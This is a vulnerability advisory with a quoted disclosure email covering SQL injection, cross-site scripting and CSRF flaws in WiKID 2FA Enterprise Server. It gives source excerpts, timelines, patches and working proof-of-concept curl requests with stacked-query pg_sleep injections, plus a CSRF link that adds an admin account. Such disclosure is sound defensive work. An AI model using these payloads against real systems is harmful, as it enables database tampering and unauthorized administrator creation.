WiKID Systems 2FA Enterprise Server SQL injection

# WiKID Systems 2FA Enterprise Server SQL injection

**Author:** Aaron Bishop

## CVE-2019-16917

---

A SQL Injection vulnerability, CVE-2019-16917, was identified on `WiKID Systems 2FA Enterprise Server` through version `4.2.0-b2047`. The uid and domain parameters, used by **searchDevices.jsp**, are not sanitized before being included in a SQL query thus allowing an authenticated user to create, read, update, or delete information in the database.

## Patch

* **4.2.0.b2047**: <https://downloads.wikidsystems.com/wikid-server-enterprise-4.2.0.b2047-1.noarch.rpm>

## Timeline

* 14 Sep 2019 - Issue discovered on `WiKID Systems 2FA Enterprise Server 4.2.0-b2032` and disclosed to WiKID Systems.
* 26 Sep 2019 - Issue confirmed by WiKID Systems, Patch Released
* 16 Oct 2019 - Public Disclosure

## Description

The source code for **searchDevices.jsp** reveals the `buildSearchWhereClause`. The **uid** and **domain** parameters are retrieved in the `buildSearchWhereClause` function:

```
191     private void buildSearchWhereClause(HttpServletRequest request) {
192         where = "";
193         String uid=request.getParameter("uid");
194         String domain=request.getParameter("domain");
```
### domain parameter

If the **domain** parameter is set and **uid** parameter is not set, **domain** is included, in the query allowing SQL injection here:

```
203         }else if(!domain.equals("0") && uid==null){
204             where="where domainid="+domain;
```

If the **uid** parameter is set, the **domain** parameter is included, in the query allowing SQL injection here:

```
205         }else if(uid!=null){
...
214             if(!domain.equals("0")){
215                 where=where+" and domainid="+domain;
216             }
217         }
218     }
```

The backend database is Postgres which supports Stacked Queries.  A value such as `1; select pg_sleep(10);--` will cause the database and application will hang for 10+ seconds, the original query will execute followed a second query to sleep for 10 seconds:

```
SLEEP=10; HOST=$RHOST; COOKIE=$COOKIE; time curl -v -i -s -k  -X 'POST' -H "Host: $HOST" -H "Cookie: JSESSIONID=$COOKIE;" --data-binary "uid=test&domain=1;select pg_sleep($SLEEP);--&action=Search" https://$HOST/WiKIDAdmin/searchDevices.jsp
```
### uid parameter

If the **uid** parameter is set, the logic drops down to following block where the **uid** parameter is included in the query:

```
205         }else if(uid!=null){
206             uid=uid.toLowerCase().trim();
207             String ask=uid.substring(uid.length()-1);
208             if(ask!=null ){
209 //                uid=uid.substring(0,uid.length()-1);
210                 where="where RTRIM(LOWER(userid)) like LOWER('%"+uid+"%')";
211 //            }else{
212 //                where="where RTRIM(LOWER(userid))=LOWER('"+uid+"')";
213             }
```

A request, such as the following, will trigger the issue, causing the application to delay for 10+ seconds:

```
SLEEP=10; HOST=$RHOST; COOKIE=$COOKIE; time curl -v -i -s -k  -X 'POST' -H "Host: $HOST" -H "Cookie: JSESSIONID=$COOKIE;" --data-binary "uid=1;select pg_sleep($SLEEP);--&action=Search" https://$HOST/WiKIDAdmin/searchDevices.jsp
```

## CVE-2019-17117

---

A SQL Injection vulnerability, CVE-2019-17117, was identified on `WiKID Systems 2FA Enterprise Server` through version `4.2.0-b2053`. The **key** parameter, used in **processPref.jsp**, is not sanitized before being included in a SQL query thus allowing an authenticated user to create, read, update, or delete arbitrary information in the database.

## Patch

* **4.2.0.b2053**: <https://downloads.wikidsystems.com/wikid-server-enterprise-4.2.0.b2053-1.noarch.rpm>

## Timeline

* 26 Sep 2019 - Issue discovered on `WiKID Systems 2FA Enterprise Server 4.2.0-b2032`
* 29 Sep 2019 - Issue disclosed to WiKID Systems
* 09 Oct 2019 - Issue confirmed by WiKID Systems, Patch released
* 16 Oct 2019 - Public Disclosure

## Description

The source code for **processPref.jsp** reveals the following code block:

```
121     } else if (request.getParameter("action").equals("Update")) {
122         // need to do error checking here.
123         sql = "SELECT key FROM parms1to1 where key='" + request.getParameter("key") + "'";
124         ResultSet result = stat.executeQuery(sql);
125         if (!result.next()) {
126     %>
```

If the **action** parameter is set to `Update`, the **key** parameter is included in a SQL query used to retrieve the Parameter that will be updated. The **key** parameter is not sanitized before it is included in the query. A request such as:

```
https://$RHOST/WiKIDAdmin/processPref.jsp?action=Update&key=test%27;%20SELECT%20pg_sleep(5);--
```

Will cause the application to delay for at least 5 seconds.

## CVE-2019-17119

---

Multiple SQL Injection vulnerabilities, CVE-2019-17119, were identified on `WiKID Systems 2FA Enterprise Server` through version `4.2.0-b2053`. The substring and source parameters, used by **Logs.jsp**, are not sanitized before being included in a SQL query thus allowing an authenticated user to create, read, update, or delete arbitrary information in the database.

## Patch

* **4.2.0.b2053**: <https://downloads.wikidsystems.com/wikid-server-enterprise-4.2.0.b2053-1.noarch.rpm>

## Timeline

* 26 Sep 2019 - Issue discovered on `WiKID Systems 2FA Enterprise Server 4.2.0-b2032`
* 29 Sep 2019 - Issue disclosed to WiKID Systems
* 09 Oct 2019 - Issue confirmed by WiKID Systems, Patch released
* 16 Oct 2019 - Public Disclosure

## Description

The source code for **Logs.jsp** reveals the following logic:

```
192     private String createSourceFilter(HttpServletRequest request) {
193         String source = getLogConfig(request).get("source");
194         if (source == null || "None".equals(source)) {
195             return " ";
196         }
197         return " and logger_name = '" + source + "' ";
198     }
199
200     private String createSubStringFilter(HttpServletRequest request) {
201         String subString = getLogConfig(request).get("subString");
202         if (subString == null || subString.trim().length() == 0) {
203             return " ";
204         }
205         return " and rendered_message like '%" + subString + "%' ";
206     }
```

`createSourceFilter` reads the **source** parameter and includes the value in a query being constructed;`createSubStringFilter` reads the **substring** parameter and includes the value in a query that is being constructed.

The following queries can be used to demonstrate the parameters are vulnerable, the queries take advantage of Stacked Queries in Postgres; a secondary request is issued that causes the database and application to delay for 5+ seconds:

```
time curl --output /dev/null -s -k -H "Cookie: JSESSIONID=$COOKIE" --data-binary "source='; select pg_sleep(5);--" https://$RHOST/WiKIDAdmin/Log.jsp

real    0m10.572s
user    0m0.008s
sys     0m0.016s
```
```
time curl --output /dev/null -s -k -H "Cookie: JSESSIONID=$COOKIE" --data-binary "subString='; select pg_sleep(5);--" https://$RHOST/WiKIDAdmin/Log.jsp

real    0m10.572s
user    0m0.008s
sys     0m0.016s
```

---

*From*: Aaron Bishop <aaron () securitymetrics com>

```
WiKID Systems 2FA Enterprise Serverversion 4.2.0-b2032 and earlier was
found to be vulnerable to multiple Cross-Site Scripting, SQLi, and CSRF
issues.

*searchDevices.jsp* is vulnerable to SQL injection through the *uid* and
*domain* parameters.  The application uses Postgres which supports Stacked
Queries, the issue can be seen by submitting a request like:

SLEEP=10; HOST=$RHOST; COOKIE=$COOKIE; time curl -v -i -s -k  -X
'POST' -H "Host: $HOST" -H "Cookie: JSESSIONID=$COOKIE;" --data-binary
"uid=test&domain=1;select pg_sleep($SLEEP);--&action=Search"
<https://$HOST/WiKIDAdmin/searchDevices.jsp>

The request will cause the database to sleep for 10+ seconds.  This issue
has been assigned *CVE-2019-16917*.

*processPref.jsp* is vulnerable to SQL injection through the *key* parameter
if the action parameter is set to *update.*  The following request will
trigger the issue for an authenticated user:

<https://$RHOST/WiKIDAdmin/processPref.jsp?action=Update&key=test%27;%20SELECT%20pg_sleep>(5);--

The request will cause the database to sleep for 5+ seconds.  This issue
has been assigned *CVE-2019-17117.*

*Logs.jsp* is vulnerable to SQL injection through the *substring *and
*source* parameters.  The following request will demonstrate the issue:

time curl --output /dev/null -s -k -H "Cookie: JSESSIONID=$COOKIE"
--data-binary "source='; select pg_sleep(5);--"
<https://$RHOST/WiKIDAdmin/Log.jsp>

real    0m10.572s
user    0m0.008s
sys     0m0.016s

The request will cause the database to sleep for 5+ seconds.  This issue
has been assigned *CVE-2019-17119*

*usrPreregistration.jsp *is vulnerable to cross site scripting by uploading
a malicious .csv file containing <script> elements. This issue has been
assigned *CVE-2019-17114*

*Logs.jsp *is vulnerable to cross site scripting by triggering errors in
the unauthenticated portion of the application. The errors are severe
enough to appear in the logs by default.  This issue has been assigned
*CVE-2019-17115.*

*groups.jsp *is vulnerable to cross site scripting by creating a group with
a name that contains <script> elements. This issue has been assigned
*CVE-2019-17116*

*adm_usrs.jsp *is vulnerable to cross site scripting when an admin is
created with a username containing <script> elements. This issue has been
assigned *CVE-2019-17120*

The application does not implement CSRF protection.  Tricking an
authenticated user to click a link like:

<a href="<https://$RHOST/WiKIDAdmin/adm_usrs.jsp?usr=pentest&newpass1=password1&newpass2=password1&action=Add">;>WiKIDAdmin
Manual</a>

Will result in an admin user unintentionally being created. This issue has
been assigned *CVE-2019-17118*
